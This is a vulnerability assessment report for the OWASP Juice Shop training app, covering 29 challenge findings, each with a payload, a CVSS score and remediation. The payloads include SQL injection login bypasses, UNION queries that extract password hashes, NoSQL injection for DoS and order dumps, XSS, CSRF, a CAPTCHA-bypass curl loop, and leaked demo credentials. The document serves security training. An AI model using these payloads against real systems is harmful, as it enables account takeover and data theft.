
# OWASP Juice Shop — Vulnerability Assessment Report

---

## 1. Score Board

**Finding ID:** JS-01** 
****Target:** `/#/score-board` 
**Title:** Hidden Score Board Discovery
******Vulnerability Type:** Security Misconfiguration / Improper Access Control
******Brief:** The score board page is hidden from navigation but accessible via direct URL. Finding it is itself a challenge testing whether users enumerate application routes.

******Payload:** Navigate directly to**** `/#/score-board` 

**CVSS Score:** 2.7 (Low) — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N** ** 
**Remediation:** Restrict sensitive pages behind authentication and avoid security through obscurity.** 
****Rationale:** Hidden pages that rely solely on obscurity for protection violate defense-in-depth principles.** **
**References:** OWASP A05:2021 – Security Misconfiguration

---

## 2. DOM XSS

**Finding ID:** JS-02** 
****Target:** Search bar (`/#/search?q=`)** 
****Title:** DOM-Based Cross-Site Scripting** ** 
**Vulnerability Type:** XSS — DOM-Based** 
****Brief:** User input is reflected into the DOM without sanitization, allowing script execution in the victim's browser context.** **

**Payload:**

```html
<iframe src="javascript:alert(`xss`)">
```

**CVSS Score:** 6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N** 
****Remediation:** Use** **`textContent`instead of** **`innerHTML`. 
Implement a strict Content Security Policy. Sanitize all user-controlled input before DOM insertion.** ****Rationale:** DOM XSS bypasses server-side filters entirely since the payload never reaches the server.**References:** OWASP A03:2021 – Injection; CWE-79

---

## 3. Bonus Payload

**Finding ID:** JS-03** ****T
arget:** Search bar (`/#/search?q=`)**

****Title:** DOM XSS — Bonus Payload (Embedded Media)**Vulnerability Type:** XSS — DOM-Based**
****Brief:** Extension of the DOM XSS challenge using a more complex iframe payload embedding external media, demonstrating that XSS payloads aren't limited to** **`alert()`.** 
**Payload:**

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```

**CVSS Score:** 6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N** ****Remediation:** Same as JS-02. CSP should block external frame sources via** **`frame-src` directive.** ****Rationale:** Real-world XSS attacks embed malicious content or exfiltrate data — not just** **`alert()`.** ****References:** OWASP A03:2021 – Injection; CWE-79

---

## 4. Reflected XSS

**Finding ID:** JS-04** 
****Target:** Order tracking page (`/#/track-result?id=`)** 
**
**Title:** Reflected Cross-Site Scripting
**Vulnerability Type:** XSS — Reflected** 
**
**Brief:** A URL parameter is reflected back into the page response without encoding, allowing an attacker to craft a malicious link that executes script in the victim's browser.** ****Payload:**

```html
<iframe src="javascript:alert(`xss`)">
```

Delivered via:** **`/#/track-result?id=<payload>`

**CVSS Score:** 6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N** ****Remediation:** HTML-encode all reflected input. Implement CSP headers. Use** **`X-XSS-Protection` header.** ****Rationale:** Reflected XSS is commonly used in phishing attacks where victims click crafted links.** ****References:** OWASP A03:2021 – Injection; CWE-79

---

## 5. Login Admin

**Finding ID:** JS-05** 
****Target:** `/#/login` → POST** **`/rest/user/login` 

**Title:** SQL Injection Authentication Bypass — Admin Account** 
**
**Vulnerability Type:** SQL Injection — Authentication Bypass** 
**
**Brief:** The login form is vulnerable to classic SQL injection, allowing authentication bypass without knowing the admin password.** ****Payload:**

```
Email:    ' OR 1=1--
Password: anything
```

**CVSS Score:** 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H** ****Remediation:** Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.** ****Rationale:** Authentication bypass via SQLi gives full admin access, the highest-impact injection class.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 6. Login MC SafeSearch

**Finding ID:** JS-06** ****Target:** `/#/login` 

**Title:** Credentials Exposed via Public OSINT (Social Engineering)** 
****Vulnerability Type:** Sensitive Data Exposure / OSINT** 
**
**Brief:** MC SafeSearch's password is derivable from publicly available information (a YouTube music video where he sings about his password). No technical exploit required.** ** 

**Payload:** Credentials:** **`mc.safesearch@juice-sh.op` /** **`Mr. N00dles`

 **CVSS Score:** 5.3 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N** ****Remediation:** Enforce strong, unique password policies. Conduct user security awareness training. Implement MFA.** ****Rationale:** Demonstrates that weak passwords derived from personal information are trivially discoverable via OSINT.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; CWE-521

---

## 7. Login Jim

**Finding ID:** JS-07** 
****Target:** `/#/login` 

**Title:** SQL Injection Login — Jim's Account** 
****Vulnerability Type:** SQL Injection — Authentication Bypass** 
**
**Brief:** Jim's account can be accessed via SQL injection using his email (discoverable via the** **`/rest/user/whoami` or registration error enumeration), referencing Star Trek trivia for the security question.** ****Payload:**

```
Email:    jim@juice-sh.op'--
Password: anything
```

**CVSS Score:** 8.8 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N** ****Remediation:** Parameterized queries. Rate limit login attempts. Enable account lockout.** ****Rationale:** User account takeover via SQLi exposes personal data and order history.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 8. Login Bender

**Finding ID:** JS-08** 
****Target:** `/#/login` 

**Title:** SQL Injection Login — Bender's Account** 
**
**Vulnerability Type:** SQL Injection — Authentication Bypass** ****Brief:** Same SQLi vector as JS-07 applied to Bender's account.** **

**Payload:**

```
Email:    bender@juice-sh.op'--
Password: anything
```

**CVSS Score:** 8.8 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N** ****Remediation:** Parameterized queries. Input validation. MFA enforcement.** ****Rationale:** Confirms the SQLi vulnerability is systemic, not isolated to a single account.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 9. API-only XSS

**Finding ID:** JS-09** 
**
**Target:** `POST /api/Products` 
**Title:** Persisted XSS via Direct API Interaction** ** 

**Vulnerability Type:** XSS — Stored / Persistent** 
****Brief:** The product creation API endpoint does not sanitize input, allowing XSS payloads to be stored and rendered when any user views the product listing — without using the frontend at all.** 
**
**Payload:** Via curl/Burp to** **`POST /api/Products`:

```json
{
  "name": "XSS Test",
  "description": "<iframe src=\"javascript:alert(`xss`)\">",
  "price": 1,
  "image": "default.jpg"
}
```

**CVSS Score:** 7.4 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N** ****Remediation:** Sanitize input at the API layer, not just the frontend. Treat all input as untrusted regardless of source.** ****Rationale:** Client-side validation is trivially bypassed; server-side sanitization is mandatory.** ****References:** OWASP A03:2021 – Injection; CWE-79

---

## 10. Bjoern's Favorite Pet

**Finding ID:** JS-10** 
**
**Target:** `/#/forgot-password` 

**Title:** Password Reset via OSINT — Security Question Bypass
**Vulnerability Type:** Broken Authentication / OSINT** 
****Brief:** Bjoern's security question asks for his favorite pet's name. The answer (`Zaya`) is discoverable from his public social media profiles.** 
**
**Payload:** Email:** **`bjoern@owasp.org` → Security answer:** **`Zaya` 

**CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ** **Remediation:** Eliminate knowledge-based security questions. Use email-based or TOTP-based password reset flows instead.** ** **Rationale:** Security questions based on publicly discoverable personal facts provide no real security.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; NIST SP 800-63B

---

## 11. CAPTCHA Bypass

**Finding ID:** JS-11** 
**
**Target:** `POST /api/Feedbacks` 

**Title:** CAPTCHA Bypass via Direct API Calls** ** 
**Vulnerability Type:** Broken Anti-Automation** **
**Brief:** The CAPTCHA is enforced only on the frontend. By submitting feedback directly to the API (bypassing the UI), the CAPTCHA is never evaluated. Submitting 10+ requests in 20 seconds triggers the challenge.

**Payload:** Script or Burp Intruder sending rapid POST requests:

```bash
for i in $(seq 1 10); do
  curl -s -X POST http://<host>/api/Feedbacks \
    -H "Content-Type: application/json" \
    -d '{"comment":"spam","rating":1,"captcha":"1","captchaId":1}';
done
```

**CVSS Score:** 5.3 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N** ****Remediation:** Validate CAPTCHA server-side on every API request, not just via frontend logic.** ****Rationale:** Client-side-only controls are trivially bypassed by intercepting and replaying requests.** ****References:** OWASP A04:2021 – Insecure Design; CWE-799

---

## 12. CSRF

**Finding ID:** JS-12**
****Target:** `POST /profile` (user name change endpoint)**
****Title:** Cross-Site Request Forgery — Profile Name Change**

****Vulnerability Type:** CSRF** ****Brief:** The name-change endpoint lacks CSRF token validation, allowing a malicious page on another origin to silently submit a forged request on behalf of an authenticated user.** **

**Payload:** HTML page hosted on attacker origin: also toggle shield in the search bar, change the cookie settings to lax in about:config

```html
<form action="http://<juiceshop>/profile" method="POST">
  <input name="username" value="CSRFed">
</form>
<script>document.forms[0].submit();</script>
```

**CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N** ****Remediation:** Implement CSRF tokens on all state-changing endpoints. Use** **`SameSite=Strict` cookie attribute.** ****Rationale:** CSRF exploits the browser's automatic cookie inclusion to forge authenticated requests.** ****References:** OWASP A01:2021 – Broken Access Control; CWE-352

---

## 13. Client-side XSS Protection Bypass

**Finding ID:** JS-13** 
****Target:** User registration — email field** 
**
**Title:** Persisted XSS Bypassing Client-Side Validation
**Vulnerability Type:** XSS — Stored** 
**
**Brief:** The frontend validates the email field format, blocking XSS payloads. By intercepting the request with Burp and modifying the email field post-validation, the payload bypasses the client-side check and gets stored.** 
**
**Payload:** Intercept** **`POST /api/Users`, change email to:

```html
<iframe src="javascript:alert(`xss`)">
```

**CVSS Score:** 7.4 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N** ****Remediation:** Enforce all validation server-side. Client-side validation is UX only, never a security control.** ****Rationale:** Any client-side control can be bypassed by a proxy tool in under 10 seconds.** ****References:** OWASP A03:2021 – Injection; CWE-79; CWE-602

---

## 14. Database Schema

**Finding ID:** JS-14** 
**
**Target:** Search bar / product search API** 
**
**Title:** Full Database Schema Exfiltration via SQL Injection

**Vulnerability Type:** SQL Injection — Information Disclosure** ****Brief:** The search functionality is vulnerable to UNION-based SQL injection, allowing extraction of the entire database schema from** **`sqlite_master`.** **

**Payload:**

```sql
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

**CVSS Score:** 7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Parameterized queries. Principle of least privilege on DB accounts. Disable detailed error messages.** ****Rationale:** Schema knowledge enables targeted, deeper attacks against all other tables and relationships.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 15. Login Amy

**Finding ID:** JS-15** 
**
**Target:** `/#/login` 
**Title:** Credential Discovery via OSINT — Weak Password** ** 

**Vulnerability Type:** Sensitive Data Exposure / OSINT** 
****Brief:** Amy's password is based on the "Nuvola" password pattern referenced in a published security paper she is associated with. Despite appearing random, it follows a predictable formula derivable from public research.** 
**
**Payload:** Credentials:** **`amy@juice-sh.op` /** **`K1f...` (derived from the Nuvola pattern — refer to the paper referenced in the challenge hint)** 
**
**CVSS Score:** 5.3 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N**Remediation:** Enforce password managers. Prohibit passwords following known patterns. Implement MFA.** ** **Rationale:** Passwords that appear complex but follow a published pattern are vulnerable to targeted attacks.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; CWE-521

---

## 16. Reset Jim's Password

**Finding ID:** JS-16** 
**
**Target:** `/#/forgot-password` 

**Title:** Password Reset via OSINT — Jim's Security Question

**Vulnerability Type:** Broken Authentication / OSINT** ****Brief:** Jim's security question asks for his eldest sibling's middle name. Jim is a reference to James T. Kirk (Star Trek). His brother's name is** **`George Samuel Kirk` — middle name** **`Samuel`.** 
**
**Payload:** Email:** **`jim@juice-sh.op` → Security answer:** **`Samuel` 

**CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Replace security questions with secure reset flows (time-limited email tokens, TOTP).** ****Rationale:** Pop-culture-derived answers are trivially researchable.** ** **References:** OWASP A07:2021 – Identification and Authentication Failures; NIST SP 800-63B

---

## 17. CSP Bypass

**Finding ID:** JS-17** 
****Target:** `/dataerasure` (legacy page)** 
**
**Title:** Content Security Policy Bypass — Legacy Page XSS

**Vulnerability Type:** XSS — CSP Bypass** 
****Brief:** The main application enforces CSP, but a legacy** **`/dataerasure` page lacks proper CSP headers, allowing inline script execution.** 
**
**Payload:** In the** **`?email=` parameter of** **`/dataerasure`:

```html
<script>alert(`xss`)</script>
```

**CVSS Score:** 6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N** ****Remediation:** Apply consistent CSP headers across all application pages including legacy routes. Audit all endpoints for uniform security header coverage.**Rationale:** A single unprotected legacy page undermines the entire CSP strategy.** ****References:** OWASP A05:2021 – Security Misconfiguration; CWE-79; Mozilla CSP Docs

---

## 18. Christmas Special

**Finding ID:** JS-18** 
**
**Target:** Search / order endpoint** 
**
**Title:** SQL Injection — Hidden Product Retrieval** 
**
**Vulnerability Type:** SQL Injection** 
**
**Brief:** The 2014 Christmas special product is hidden (deleted flag set) and won't appear in normal search results. SQL injection in the search allows querying deleted products and adding them to cart.** **

**Payload:** Search query:

```sql
'))--
```

This closes the SQL query and comments out the** **`deletedAt IS NULL` filter, returning all products including hidden ones. Then add item ID 10 to cart.** ****CVSS Score:** 7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N**Remediation:** Parameterized queries. Enforce business logic at the application layer, not SQL filter conditions alone.**Rationale:** Business logic enforced only via SQL WHERE clauses can be bypassed by injection.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 19. Ephemeral Accountant

**Finding ID:** JS-19** 
**
**Target:** `/#/login` 

**Title:** SQL Injection — Login as Non-Existent User** 
****Vulnerability Type:** SQL Injection — Authentication Bypass** 
****Brief:** Log in as** **`acc0unt4nt@juice-sh.op` which doesn't exist in the database, by injecting a UNION SELECT that synthesizes a fake user record on the fly.** **

**Payload:**

```sql
Email:    ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:14:41.644 +00:00' as 'updatedAt', null as 'deletedAt')--
Password: anything
```

**CVSS Score:** 9.1 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N** ****Remediation:** Parameterized queries. This attack is impossible against properly prepared statements.** ****Rationale:** UNION-based SQLi can fabricate authentication records, completely bypassing identity verification.** ****References:** OWASP A03:2021 – Injection; CWE-89

---

## 20. HTTP-Header XSS

**Finding ID:** JS-20** 
**
**Target:** `True-Client-IP` HTTP header →** **`/rest/saveLoginIp` 

**Title:** Persisted XSS via HTTP Request Header** 
**
**Vulnerability Type:** XSS — Stored / HTTP Header Injection** 
****Brief:** The application logs the** **`True-Client-IP` header value to the database without sanitization. By sending a malicious payload in this header, it gets stored and rendered in the admin's last login IP field.** **

**Payload:** Add to request header:

```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

**CVSS Score:** 7.4 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N** ****Remediation:** Sanitize all logged values including HTTP headers before storage and display. Never trust client-supplied headers.** ****Rationale:** HTTP headers are fully attacker-controlled and must be treated as untrusted input.** ****References:** OWASP A03:2021 – Injection; CWE-79; CWE-116

---

## 21. NoSQL DoS

**Finding ID:** JS-21** 
****Target:** `POST /rest/products/reviews` 

**Title:** NoSQL Injection — Denial of Service via Sleep
**Vulnerability Type:** NoSQL Injection / DoS** 
****Brief:** The product reviews endpoint passes user input directly into a MongoDB query. Injecting a** **`$where` clause with** **`sleep()` causes the database to hang, creating a server-side DoS condition.** **

**Payload:**

```json
{ "id": "1", "$where": "sleep(2000)" }
```

**CVSS Score:** 7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H** ****Remediation:** Disable MongoDB** **`$where` operator. Sanitize and validate all query inputs. Use allowlist-based query construction.** ****Rationale:** NoSQL databases are equally vulnerable to injection — the attack surface extends beyond SQL.** ****References:** OWASP A03:2021 – Injection; CWE-943

---

## 22. NoSQL Manipulation

**Finding ID:** JS-22** 
**
**Target:** `PATCH /rest/products/reviews` 

**Title:** NoSQL Injection — Bulk Review Manipulation

**Vulnerability Type:** NoSQL Injection** 
****Brief:** The review update endpoint uses unsanitized input in a MongoDB query selector, allowing an attacker to update all reviews simultaneously by injecting a wildcard condition.** **

**Payload:**

```json
{ "id": { "$gt": "" }, "message": "Injected review text" }
```

**CVSS Score:** 7.1 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N** ****Remediation:** Validate that query selectors only contain expected scalar types. Reject objects where strings are expected.** ****Rationale:** Accepting JSON objects as query parameters without type-checking enables operator injection.** ****References:** OWASP A03:2021 – Injection; CWE-943

---

## 23. Reset Bender's Password

**Finding ID:** JS-23** 
**
**Target:** `/#/forgot-password` 

**Title:** Password Reset via OSINT — Bender's Security Question

**Vulnerability Type:** Broken Authentication / OSINT** 
**
**Brief:** Bender's security question asks for his company name. Bender is a Futurama reference — his full name is Bender Bending Rodriguez, and his company is** **`Stop'n'Drop`.

**Payload:** Email:** **`bender@juice-sh.op` → Security answer:** **`Stop'n'Drop` 

**CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Replace knowledge-based authentication with secure token-based reset flows.** ****Rationale:** Pop-culture character details are easily researched, making these questions ineffective.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; NIST SP 800-63B

---

## 24. Server-side XSS Protection Bypass

**Finding ID:** JS-24** 
****Target:** Profile picture upload / PDF invoice generation** 
**
**Title:** Persisted XSS Bypassing Server-Side Sanitization** 
**
**Vulnerability Type:** XSS — Stored / Server-Side Filter Bypass** 
**
**Brief:** The server sanitizes XSS in most fields, but the PDF invoice generator renders HTML. By injecting an XSS payload via the username field and triggering invoice generation, the payload executes in the PDF rendering context.** **

**Payload:** Set username to:

```html
<iframe src="javascript:alert(`xss`)">
```

Then request an order PDF invoice.

**CVSS Score:** 7.4 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N** ****Remediation:** Apply consistent sanitization across all rendering contexts including PDF generators. Use headless browser sandboxing for PDF rendering.**Rationale:** Server-side protection that only covers some rendering paths creates exploitable gaps.** ****References:** OWASP A03:2021 – Injection; CWE-79

---

## 25. User Credentials via SQL Injection

**Finding ID:** JS-25** 
**
**Target:** Search functionality** 
**
**Title:** Full User Credential Exfiltration via UNION SQL Injection

**Vulnerability Type:** SQL Injection — Data Exfiltration** 
**
**Brief:** UNION-based SQL injection in the product search allows querying the Users table directly, exfiltrating all email addresses and password hashes.** **

**Payload:**

```sql
')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
```

**CVSS Score:** 9.1 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Parameterized queries. Hash passwords with bcrypt/argon2. Apply column-level encryption on sensitive fields.** ****Rationale:** Credential exfiltration enables offline password cracking and account takeover at scale.** ****References:** OWASP A03:2021 – Injection; CWE-89; CWE-312

---

## 26. NoSQL Exfiltration

**Finding ID:** JS-26** 
**
**Target:** `GET /rest/track-order/:id` 

**Title:** NoSQL Injection — Exfiltrate All Orders** 
**
**Vulnerability Type:** NoSQL Injection — Data Exfiltration** 
**
**Brief:** The order tracking endpoint passes the order ID directly into a MongoDB query. Injecting a regex wildcard returns all orders from all users.** **
**Payload:**

```
/rest/track-order/{"$regex":".*"}
```

Or URL encoded:** **`/rest/track-order/%7B%22%24regex%22%3A%22.*%22%7D`

**CVSS Score:** 7.5 (High) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Validate input type strictly — order IDs should be alphanumeric strings, never objects. Sanitize against MongoDB operator injection.**Rationale:** NoSQL regex operators allow wildcard data extraction equivalent to** **`SELECT * FROM orders`.** ** **References:** OWASP A03:2021 – Injection; CWE-943

---

## 27. Reset Bjoern's Password (Internal Account)

**Finding ID:** JS-27** 
**
**Target:** `/#/forgot-password` 

**Title:** Password Reset via OSINT — Bjoern's Internal Account
**Vulnerability Type:** Broken Authentication / OSINT** 
****Brief:** Bjoern's internal account security question asks for his favorite pet. Same answer as JS-10 (`Zaya`) but targeting his internal** **`@juice-sh.op` account rather than the OWASP account.** 
**
**Payload:** Email:** **`bjoern.kimminich@juice-sh.op` → Security answer:** **`Zaya` 

**CVSS Score:** 6.5 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N** ****Remediation:** Remove security questions entirely. Enforce MFA on all privileged accounts.** ****Rationale:** Reusing discoverable personal facts across multiple accounts compounds the exposure.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; NIST SP 800-63B

---

## 28. Login Support Team

**Finding ID:** JS-28** 
****Target:** `/#/login` 
**Title:** Hardcoded Credentials Discovery via Source Code Analysis** 
**
**Vulnerability Type:** Security Misconfiguration / Hardcoded Credentials** 
****Brief:** The support team credentials are embedded in the application's source code or configuration files. Code analysis of the frontend bundle reveals the username and password.

**Payload:** Inspect** **`main.js` bundle for the string** **`support` or** **`team`:

```bash
curl http://<host>/main.js | grep -i "support\|team\|password"
```

Credentials:** **`support@juice-sh.op` /** **`J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P`

**CVSS Score:** 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H** ****Remediation:** Never hardcode credentials in source code or client-side bundles. Use secrets management systems (Vault, AWS Secrets Manager). Rotate all exposed credentials immediately.** ****Rationale:** Hardcoded credentials in shipped code are permanently exposed to anyone who downloads the application.** ****References:** OWASP A07:2021 – Identification and Authentication Failures; CWE-798

---

## 29. Video XSS

**Finding ID:** JS-29** 
****Target:** `/promotion` video page** 
****Title:** XSS via Embedded Subtitle Injection in Video Player

**Vulnerability Type:** XSS — Stored / Media Injection** 
**
**Brief:** The promotional video page renders WebVTT subtitle files. By uploading a crafted subtitle file containing an XSS payload, the video player renders the script tag when subtitles display.** 
**
**Payload:** Craft a** **`.vtt` file:

```
WEBVTT

1
00:00:01.000 --> 00:00:10.000
</script><script>alert(`xss`)</script>
```

Upload via the video subtitle upload endpoint, then visit** **`/promotion`.

**CVSS Score:** 6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N** ****Remediation:** Sanitize subtitle file content server-side. Use a dedicated subtitle parser that strips HTML/JS. Apply strict CSP.** ****Rationale:** File upload attack surfaces extend to media metadata and subtitle formats, not just binary executables.** ****References:** OWASP A03:2021 – Injection; CWE-79; CWE-434

---

## Summary Table

| ID    | Title                   | Type             | CVSS | Severity |
| ----- | ----------------------- | ---------------- | ---- | -------- |
| JS-01 | Hidden Score Board      | Misconfiguration | 2.7  | Low      |
| JS-02 | DOM XSS                 | XSS              | 6.1  | Medium   |
| JS-03 | Bonus Payload           | XSS              | 6.1  | Medium   |
| JS-04 | Reflected XSS           | XSS              | 6.1  | Medium   |
| JS-05 | Login Admin             | SQLi             | 9.8  | Critical |
| JS-06 | Login MC SafeSearch     | OSINT            | 5.3  | Medium   |
| JS-07 | Login Jim               | SQLi             | 8.8  | High     |
| JS-08 | Login Bender            | SQLi             | 8.8  | High     |
| JS-09 | API-only XSS            | XSS Stored       | 7.4  | High     |
| JS-10 | Bjoern's Pet            | OSINT            | 6.5  | Medium   |
| JS-11 | CAPTCHA Bypass          | Anti-Automation  | 5.3  | Medium   |
| JS-12 | CSRF                    | CSRF             | 6.5  | Medium   |
| JS-13 | Client-side XSS Bypass  | XSS Stored       | 7.4  | High     |
| JS-14 | Database Schema         | SQLi             | 7.5  | High     |
| JS-15 | Login Amy               | OSINT            | 5.3  | Medium   |
| JS-16 | Reset Jim's Password    | OSINT            | 6.5  | Medium   |
| JS-17 | CSP Bypass              | XSS              | 6.1  | Medium   |
| JS-18 | Christmas Special       | SQLi             | 7.5  | High     |
| JS-19 | Ephemeral Accountant    | SQLi             | 9.1  | Critical |
| JS-20 | HTTP-Header XSS         | XSS Stored       | 7.4  | High     |
| JS-21 | NoSQL DoS               | NoSQLi           | 7.5  | High     |
| JS-22 | NoSQL Manipulation      | NoSQLi           | 7.1  | High     |
| JS-23 | Reset Bender's Password | OSINT            | 6.5  | Medium   |
| JS-24 | Server-side XSS Bypass  | XSS Stored       | 7.4  | High     |
| JS-25 | User Credentials        | SQLi             | 9.1  | Critical |
| JS-26 | NoSQL Exfiltration      | NoSQLi           | 7.5  | High     |
| JS-27 | Reset Bjoern's Password | OSINT            | 6.5  | Medium   |
| JS-28 | Login Support Team      | Hardcoded Creds  | 9.8  | Critical |
| JS-29 | Video XSS               | XSS              | 6.1  | Medium   |
